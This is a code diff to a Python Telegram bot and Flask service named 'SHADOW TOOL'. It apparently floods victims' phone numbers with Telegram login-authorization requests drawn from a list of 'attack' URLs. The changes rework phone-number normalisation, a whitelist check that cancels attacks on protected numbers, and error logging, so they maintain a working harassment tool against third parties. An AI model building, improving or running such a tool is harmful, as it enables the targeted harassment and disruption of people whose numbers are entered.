@@ -105,13 +105,6 @@ ATTACK_URLS = [
     'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
 ]
 
-def normalize_phone(phone):
-    phone = phone.strip()
-    if phone.startswith('+'):
-        return '+' + ''.join(c for c in phone if c.isdigit())
-    else:
-        return ''.join(c for c in phone if c.isdigit())
-
 def hash_password(password):
     return hashlib.sha256(password.encode()).hexdigest()
 
@@ -121,11 +114,18 @@ def generate_token():
 def is_admin(user_id):
     return user_id in ADMIN_IDS
 
+def normalize_phone(phone):
+    """Оставляет только цифры"""
+    return ''.join(c for c in phone if c.isdigit())
+
 async def is_phone_whitelisted(phone):
+    """Проверка номера в белом списке (только по цифрам)"""
     if not WHITELIST_GIST_URL:
         return False
     
-    search_phone = normalize_phone(phone)
+    clean_phone = normalize_phone(phone)
+    if not clean_phone:
+        return False
     
     try:
         resp = await asyncio.to_thread(requests.get, WHITELIST_GIST_URL + '?t=' + str(int(datetime.now().timestamp())), timeout=10)
@@ -134,11 +134,12 @@ async def is_phone_whitelisted(phone):
         
         for item in whitelist:
             item_phone = item.get('number', '')
-            item_normalized = normalize_phone(item_phone)
-            if search_phone == item_normalized:
+            item_clean = normalize_phone(item_phone)
+            if clean_phone == item_clean:
                 return True
         return False
-    except:
+    except Exception as e:
+        print(f"Whitelist error: {e}")
         return False
 
 # ========== FLASK API ==========
@@ -254,23 +255,29 @@ def check_subscription():
 
 @flask_app.route('/is_whitelisted', methods=['POST'])
 def is_whitelisted():
+    """API для сайта — проверяет номер в белом списке"""
     if not WHITELIST_GIST_URL:
         return jsonify({'blocked': False})
     
     data = request.get_json()
     phone = data.get('phone', '')
-    normalized = normalize_phone(phone)
+    clean_phone = normalize_phone(phone)
+    
+    if not clean_phone:
+        return jsonify({'blocked': False})
     
     try:
         resp = requests.get(WHITELIST_GIST_URL + '?t=' + str(int(datetime.now().timestamp())), timeout=10)
         data = resp.json()
         whitelist = data.get('phones', [])
+        
         for item in whitelist:
-            item_normalized = normalize_phone(item.get('number', ''))
-            if item_normalized == normalized:
+            item_clean = normalize_phone(item.get('number', ''))
+            if clean_phone == item_clean:
                 return jsonify({'blocked': True})
         return jsonify({'blocked': False})
-    except:
+    except Exception as e:
+        print(f"Whitelist API error: {e}")
         return jsonify({'blocked': False})
 
 @flask_app.route('/generate_bind_code', methods=['POST'])
@@ -316,9 +323,8 @@ async def send_attack_log(telegram_id, total, current, phone, status_msg, messag
     return msg.message_id
 
 async def perform_attack(phone, telegram_id, user_id, message_id):
-    normalized_phone = normalize_phone(phone)
-    
-    if await is_phone_whitelisted(normalized_phone):
+    # Проверка белого списка
+    if await is_phone_whitelisted(phone):
         await bot.edit_message_text(
             f"⛔ <b>АТАКА ОТМЕНЕНА</b>\n\n📞 Номер: {phone}\n⚠️ Номер в белом списке",
             chat_id=telegram_id, message_id=message_id, parse_mode='HTML'
@@ -587,6 +593,7 @@ async def main():
     print(f"🚀 SHADOW TOOL запущен")
     me = await bot.get_me()
     print(f"🤖 Бот: https://t.me/{me.username}")
+    print(f"📡 WHITELIST_GIST_URL: {WHITELIST_GIST_URL}")
 
 if __name__ == '__main__':
     from threading import Thread
